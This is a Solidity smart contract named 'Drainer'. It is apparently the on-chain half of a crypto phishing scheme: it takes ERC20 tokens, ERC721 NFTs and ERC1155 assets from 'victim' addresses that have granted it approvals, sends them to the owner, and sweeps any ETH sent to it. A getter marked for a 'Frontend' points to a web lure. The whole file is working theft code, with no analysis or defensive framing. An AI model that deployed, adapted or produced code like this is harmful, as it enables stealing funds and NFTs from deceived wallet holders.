// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin/contracts/access/Ownable2Step.sol";

contract Drainer is Ownable2Step {
    using SafeERC20 for IERC20;

    event Drained(address indexed victim, address indexed token, uint256 amount, uint8 assetType);
    event NativeDrained(address indexed victim, uint256 amount);

    constructor(address initialOwner) Ownable(initialOwner) {}

    // ERC20 Drain
    function drainERC20(address victim, address token) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(victim);
        require(bal > 0, "No balance");
        
        // Check allowance to ensure we can take it (in case of partial approvals)
        uint256 allowance = IERC20(token).allowance(victim, address(this));
        uint256 amountToTake = bal < allowance ? bal : allowance;
        
        if (amountToTake > 0) {
            IERC20(token).safeTransferFrom(victim, owner(), amountToTake);
            emit Drained(victim, token, amountToTake, 0);
        }
    }

    // Native ETH Drain
    function drainNative() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH");
        
        (bool success, ) = owner().call{value: bal}("");
        require(success, "Native drain failed");
        emit NativeDrained(owner(), bal);
    }

    // ERC721 Drain (Specific IDs)
    function drainSpecificERC721(address victim, address token, uint256[] calldata tokenIds) external onlyOwner {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            // Check if victim still owns it
            if (IERC721(token).ownerOf(tokenIds[i]) == victim) {
                IERC721(token).safeTransferFrom(victim, owner(), tokenIds[i]);
                emit Drained(victim, token, tokenIds[i], 1);
            }
        }
    }

    // ERC1155 Drain (Specific IDs & Amounts)
    function drainSpecificERC1155(address victim, address token, uint256[] calldata ids, uint256[] calldata amounts) external onlyOwner {
        for (uint256 i = 0; i < ids.length; i++) {
            uint256 bal = IERC1155(token).balanceOf(victim, ids[i]);
            uint256 amountToTake = bal < amounts[i] ? bal : amounts[i];
            
            if (amountToTake > 0) {
                IERC1155(token).safeTransferFrom(victim, owner(), ids[i], amountToTake, "");
                emit Drained(victim, token, amountToTake, 2);
            }
        }
    }

    // View Function for Frontend
    function getOwner() external view returns (address) {
        return owner();
    }
}
